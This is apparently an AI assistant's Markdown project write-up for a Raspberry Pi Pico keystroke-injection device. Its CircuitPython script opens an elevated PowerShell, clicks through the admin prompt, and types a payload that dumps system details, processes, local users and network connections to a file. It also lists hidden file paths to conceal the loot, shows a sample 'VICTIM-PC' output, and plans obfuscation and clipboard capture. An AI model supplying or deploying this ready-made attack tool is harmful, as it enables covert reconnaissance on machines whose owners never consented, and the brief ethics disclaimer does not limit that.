Sure! Here's the content formatted as a clean Markdown (`.md`) file ready for GitHub or your blog:

````markdown
# 🛠️ Project: Offline USB Rubber Ducky with Raspberry Pi Pico

## 🎯 Goal  
Create a *Rubber Ducky*-style device using a Raspberry Pi Pico that, when plugged into a computer, automatically collects system information and saves it locally for later analysis—without needing internet connection or external scripts.

> This project was developed for educational purposes and testing in controlled environments (*ethical hacking lab environment*).

## 📦 What is a Rubber Ducky?  
A *USB Rubber Ducky* is a device that emulates a USB keyboard and can automatically type commands when connected to a machine. It is widely used in penetration testing and physical security demonstrations.

## ⚙️ Tools Used  
- **Raspberry Pi Pico**  
- **CircuitPython**  
- [Adafruit HID Library](https://github.com/adafruit/Adafruit_CircuitPython_HID)  
- **PowerShell** (for the payload)  
- Base project: [`pico-ducky`](https://github.com/dbisu/pico-ducky) by [dbisu](https://github.com/dbisu)  

## 📋 What does the device do?  
When the Raspberry Pi Pico is plugged into a PC:  
1. It emulates a keyboard (HID).  
2. Opens PowerShell with administrator privileges.  
3. Executes a series of commands to collect:  
   - System information (`Get-ComputerInfo`)  
   - Active processes (`Get-Process`)  
   - Local users (`Get-LocalUser`)  
   - TCP network connections (`Get-NetTCPConnection`)  
4. Saves all the information into a file named `audit.txt` on the Desktop.

### 📁 Hidden alternative locations  
```powershell
$out = "$env:APPDATA\Microsoft\Windows\Recent\syscache.txt"
# or
$out = "C:\ProgramData\sysinfo.log"
````

## 💻 Code (CircuitPython)

```python
import time
import board
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)

time.sleep(3)

keyboard.press(Keycode.GUI, Keycode.R)
keyboard.release_all()
time.sleep(0.5)

layout.write("powershell\n")
time.sleep(1)

keyboard.press(Keycode.CONTROL, Keycode.SHIFT, Keycode.ENTER)
keyboard.release_all()
time.sleep(1.2)

keyboard.press(Keycode.ALT, Keycode.Y)
keyboard.release_all()
time.sleep(0.8)

payload = (
    '$out = "$env:USERPROFILE\\Desktop\\audit.txt"; '
    'Get-ComputerInfo | Out-File $out; '
    'Get-Process | Out-File $out -Append; '
    'Get-LocalUser | Out-File $out -Append; '
    'Get-NetTCPConnection | Out-File $out -Append'
)

layout.write(payload + '\n')
time.sleep(1)
layout.write("exit\n")
```

## 📷 Results

```
ComputerName           : VICTIM-PC
OSName                 : Microsoft Windows 10 Pro
SystemType             : x64-based PC
Username               : VICTIM\user
...
--- Process List ---
Name                  ID          CPU
------------------   ----------  ----
explorer.exe         1234        3.2
chrome.exe           4567        7.8

--- Users ---
Name                 Enabled
------------------   -------
Admin                True
Guest                False
```

## 🛡️ Ethical Considerations

This type of project can be used for:

* Physical security testing
* USB attack demonstrations
* Cybersecurity labs
* Penetration testing training

> **⚠️ Important:** Never use tools like this on systems you do not own or without explicit permission.

## 🔄 Next Steps

* Version with multiple selectable payloads (via physical button)
* Screenshot and clipboard capture
* Command obfuscation
* System language detection (keyboard layout)

## 📌 Conclusion

This project is a powerful demonstration of how an affordable device like the Raspberry Pi Pico can be used to automate complex tasks in seconds.